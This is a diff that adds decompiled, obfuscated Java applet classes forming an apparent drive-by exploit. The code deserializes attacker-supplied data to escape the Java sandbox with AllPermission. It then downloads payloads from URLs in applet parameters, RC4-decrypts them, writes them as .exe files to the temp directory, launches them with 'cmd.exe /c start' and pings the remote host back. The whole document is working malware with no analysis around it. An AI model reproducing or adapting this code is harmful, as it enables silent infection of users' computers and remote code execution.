@@ -1,0 +1,280 @@
+/*
+ * Decompiled with CFR 0.152.
+ */
+import java.applet.Applet;
+import java.io.ByteArrayInputStream;
+import java.io.InputStream;
+import java.io.ObjectInputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
+import java.net.URL;
+import java.security.cert.Certificate;
+
+public class blocc
+extends Applet {
+    public static String[] deux;
+
+    public void init() {
+        try {
+            String string = this.getParameter("reit");
+            deux = this.getParameter("jura").split(blocc.race("t56yu5rr@", "t56yu5rr", ""));
+            String string2 = "t56yu5rrjava.util.cont56yu5rrcurret56yu5rrnt.atot56yu5rrmic.Atomt56yu5rricReft56yu5rrerent56yu5rrceArt56yu5rrrayt56yu5rr";
+            string2 = blocc.race(string2, "t56yu5rr", "");
+            ObjectInputStream objectInputStream = new ObjectInputStream(this.cubs(string));
+            Object[] objectArray = (Object[])lofthn.hoer(objectInputStream);
+            string2 = blocc.race(string2, "t56yu5rr", "");
+            danks[] danksArray = (danks[])objectArray[0];
+            String string3 = "Class";
+            Class[] classArray = new Class[]{Integer.TYPE, Object.class};
+            String string4 = blocc.race("gett56yu5rrLoader", "t56yu5rr", string3);
+            Object object = blocc.pulp(blocc.race("java.lang.t56yu5rr", "t56yu5rr", string3), string4, blocc.told(this));
+            blocc.burr(string2, "set", objectArray[1], classArray, new Object[]{0, object});
+            int n = 56;
+            boolean bl = true;
+            danks.slab(danksArray[0]);
+        }
+        catch (Exception exception) {
+            // empty catch block
+        }
+    }
+
+    public static Object gena(String string, Class[] classArray, Object[] objectArray) throws Exception {
+        Constructor constructor = (Constructor)blocc.burr(blocc.race("java.lang.t56yu5rr", "t56yu5rr", "Class"), blocc.race("getConst56yu5rrtructor", "t56yu5rr", ""), Class.forName(string), new Class[]{Class[].class}, new Object[]{classArray});
+        String string2 = blocc.race("newInstt56yu5rr", "t56yu5rr", "ance");
+        String string3 = blocc.race("java.lang.reflect.Constrt56yu5rructor", "t56yu5rr", "");
+        return blocc.burr(string3, string2, constructor, new Class[]{Object[].class}, new Object[]{objectArray});
+    }
+
+    ByteArrayInputStream cubs(String string) throws Exception {
+        int n = 2;
+        int n2 = string.length();
+        byte[] byArray = new byte[n2 / n];
+        int n3 = 0;
+        int n4 = 0;
+        while (n3 < n2) {
+            String string2 = string.substring(n3, n3 + n);
+            String string3 = blocc.race("0xt56yu5rr", "t56yu5rr", string2);
+            int n5 = Integer.decode(string3);
+            byArray[n4] = (byte)n5;
+            n3 += n;
+            ++n4;
+        }
+        return (ByteArrayInputStream)blocc.gena("java.io.ByteArrayInputStream", new Class[]{byte[].class}, new Object[]{byArray});
+    }
+
+    public static String race(String string, String string2, String string3) {
+        String string4 = string;
+        string4 = string4.replace(string2, string3);
+        return string4;
+    }
+
+    public static Object pulp(String string, String string2, Object object) throws Exception {
+        return blocc.burr(string, string2, object, new Class[0], new Object[0]);
+    }
+
+    public static Object burr(String string, String string2, Object object, Class[] classArray, Object[] objectArray) throws Exception {
+        Method method = Class.forName(string).getMethod(string2, classArray);
+        return lofthn.orgy(method, object, objectArray);
+    }
+
+    public static Class told(Object object) {
+        return object.getClass();
+    }
+
+    public static InputStream lets(String string) throws Exception {
+        URL uRL = new URL(string);
+        return uRL.openStream();
+    }
+
+    public static Object univ() throws Exception {
+        String string = "t56yu5rr";
+        String string2 = blocc.race("t56yu5rrjava.st56yu5rrecurity.Pt56yu5rrermist56yu5rrsions", string, "");
+        Object object = blocc.gena(string2, new Class[0], new Object[0]);
+        Object var3_3 = null;
+        String string3 = blocc.race("file:t56yu5rrt56yu5rrt56yu5rr", string, "/");
+        URL uRL = new URL(string3);
+        Object object2 = blocc.gena(blocc.race("java.set56yu5rrcurity.CodeSot56yu5rrurce", string, ""), new Class[]{blocc.told(uRL), Certificate[].class}, new Object[]{uRL, var3_3});
+        Object[] objectArray = new Object[1];
+        String string4 = blocc.race("t56yu5rrjava.st56yu5rrecurity.AllPt56yu5rrermist56yu5rrsion", string, "");
+        objectArray[0] = blocc.gena(string4, new Class[0], new Object[0]);
+        Class[] classArray = new Class[1];
+        String string5 = blocc.race("t56yu5rrjava.st56yu5rrecurity.Pt56yu5rrermist56yu5rrsion", string, "");
+        classArray[0] = Class.forName(string5);
+        blocc.burr(string2, blocc.race("at56yu5rrdd", string, ""), object, classArray, objectArray);
+        return blocc.gena(blocc.race("java.security.Protectiont56yu5rrDomain", string, ""), new Class[]{blocc.told(object2), blocc.told(object).getSuperclass()}, new Object[]{object2, object});
+    }
+}
+
+/*
+ * Decompiled with CFR 0.152.
+ */
+import java.io.InputStream;
+import java.security.ProtectionDomain;
+
+class danks
+extends lofthn {
+    danks() {
+    }
+
+    public static void slab(danks danks2) {
+        try {
+            ProtectionDomain protectionDomain = (ProtectionDomain)blocc.univ();
+            InputStream inputStream = danks2.getResourceAsStream("calka0.class");
+            if (inputStream != null) {
+                byte[] byArray = lofthn.demo(inputStream);
+                Class<?> clazz = danks2.defineClass("calka0", byArray, 0, byArray.length, protectionDomain);
+                blocc.gena("calka0", new Class[0], new Object[0]);
+            }
+        }
+        catch (Exception exception) {
+            // empty catch block
+        }
+    }
+}
+
+/*
+ * Decompiled with CFR 0.152.
+ */
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.lang.reflect.Method;
+import java.security.AccessController;
+import java.security.PrivilegedActionException;
+import java.security.PrivilegedExceptionAction;
+
+public class calka0
+implements PrivilegedExceptionAction {
+    static int cues;
+    static int trip;
+
+    public calka0() {
+        try {
+            AccessController.doPrivileged(this);
+        }
+        catch (PrivilegedActionException privilegedActionException) {
+            // empty catch block
+        }
+    }
+
+    void ping(String string, String string2) throws Exception {
+        blocc.lets(string + string2);
+    }
+
+    int ruff(InputStream inputStream, byte[] byArray) throws Exception {
+        int n;
+        int n2;
+        int n3 = byArray.length;
+        for (n = 0; n < n3 && (n2 = inputStream.read(byArray, n, n3 - n)) != -1; n += n2) {
+        }
+        return n;
+    }
+
+    public Object run() {
+        String[] stringArray = blocc.deux;
+        String string = "";
+        try {
+            String string2 = this.refs("jt56yu5rrava.t56yu5rrio.t56yu5rrtmpdirt56yu5rr");
+            String string3 = blocc.race(".et56yu5rrxt56yu5rre", "t56yu5rr", "");
+            String string4 = blocc.race("jt56yu5rrava.it56yu5rro.Fit56yu5rrleOut56yu5rrtputStt56yu5rrream", "t56yu5rr", "");
+            String string5 = blocc.race("t56yu5rrxt56yu5rrc", "t56yu5rr", "e");
+            String string6 = Long.toString(System.currentTimeMillis()) + string3;
+            String string7 = "cmd.exe /c start ";
+            byte[] byArray = new byte[8192];
+            byte[] byArray2 = new byte[256];
+            Object object = blocc.pulp(blocc.race("java.lang.Runt56yu5rrtime", "t56yu5rr", ""), blocc.race("gett56yu5rrRunt56yu5rrtime", "t56yu5rr", ""), Runtime.class);
+            for (int i = 0; i < stringArray.length; ++i) {
+                int n;
+                string = stringArray[i];
+                String string8 = string2 + i + string6;
+                InputStream inputStream = blocc.lets(string);
+                String string9 = string7 + string8;
+                cues = 0;
+                trip = 0;
+                FileOutputStream fileOutputStream = new FileOutputStream(string8);
+                int n2 = 256;
+                if (this.ruff(inputStream, byArray2) != n2) {
+                    throw new Exception();
+                }
+                while ((n = this.ruff(inputStream, byArray)) != 0) {
+                    this.kale(byArray2, byArray, n);
+                    this.ouzo(string4, fileOutputStream, new Object[]{byArray, 0, n});
+                }
+                fileOutputStream.flush();
+                fileOutputStream.close();
+                Class clazz = blocc.told(object);
+                inputStream.close();
+                Class[] classArray = new Class[]{String.class};
+                Method method = clazz.getMethod(string5, classArray);
+                Object[] objectArray = new Object[]{string9};
+                calka0.orgy(method, object, objectArray);
+            }
+            this.ping(string, blocc.race("45hg5y45;45hg5y45145hg5y45", "45hg5y45", ""));
+        }
+        catch (Exception exception) {
+            // empty catch block
+        }
+        return null;
+    }
+
+    void ouzo(String string, Object object, Object[] objectArray) throws Exception {
+        Class[] classArray = new Class[3];
+        classArray[0] = byte[].class;
+        classArray[1] = Integer.TYPE;
+        String string2 = blocc.race("t56yu5rrte", "t56yu5rr", "wri");
+        classArray[2] = Integer.TYPE;
+        blocc.burr(string, string2, object, classArray, objectArray);
+    }
+
+    public static Object orgy(Method method, Object object, Object[] objectArray) throws Exception {
+        return method.invoke(object, objectArray);
+    }
+
+    String refs(String string) throws Exception {
+        String string2 = blocc.race(string, "t56yu5rr", "");
+        String string3 = System.getProperty(string2);
+        return string3;
+    }
+
+    void kale(byte[] byArray, byte[] byArray2, int n) throws Exception {
+        for (int i = 0; i < n; ++i) {
+            cues = cues + 1 & 0xFF;
+            trip = trip + byArray[cues] & 0xFF;
+            int n2 = 553;
+            byte by = byArray[cues];
+            byArray[calka0.cues] = byArray[trip];
+            byArray[calka0.trip] = by;
+            int n3 = byArray[cues] + byArray[trip] & 0xFF;
+            byArray2[i] = (byte)(byArray2[i] ^ byArray[n3]);
+        }
+    }
+}
+
+/*
+ * Decompiled with CFR 0.152.
+ */
+import java.io.InputStream;
+import java.io.ObjectInputStream;
+import java.lang.reflect.Method;
+
+class lofthn
+extends ClassLoader {
+    lofthn() {
+    }
+
+    public static Object hoer(ObjectInputStream objectInputStream) throws Exception {
+        String string = blocc.race("rt56yu5rradObjt56yu5rrct", "t56yu5rr", "e");
+        return blocc.pulp(blocc.race("java.io.Objectt56yu5rrStream", "t56yu5rr", "Input"), string, objectInputStream);
+    }
+
+    public static Object orgy(Method method, Object object, Object[] objectArray) throws Exception {
+        return method.invoke(object, objectArray);
+    }
+
+    static byte[] demo(InputStream inputStream) throws Exception {
+        int n = inputStream.available();
+        byte[] byArray = new byte[n];
+        inputStream.read(byArray, 0, n);
+        return byArray;
+    }
+}
+
